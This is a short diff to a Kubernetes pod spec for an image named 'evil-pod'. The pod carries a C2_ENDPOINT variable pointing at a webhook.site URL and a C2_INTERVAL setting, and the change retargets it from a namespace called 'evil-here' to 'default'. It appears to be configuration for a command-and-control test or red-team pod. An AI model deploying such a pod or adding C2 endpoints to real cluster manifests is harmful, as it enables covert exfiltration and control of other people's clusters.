@@ -38,7 +38,7 @@ spec:
     image: ghcr.io/rileydakota/evil-pod:latest
     env:
     - name: TARGET_NS
-      value: "evil-here"
+      value: "default"
     - name: C2_ENDPOINT
       value: "https://webhook.site/546ef4d5-d1f6-41b6-9bc8-eedde20e609f"
     - name: C2_INTERVAL
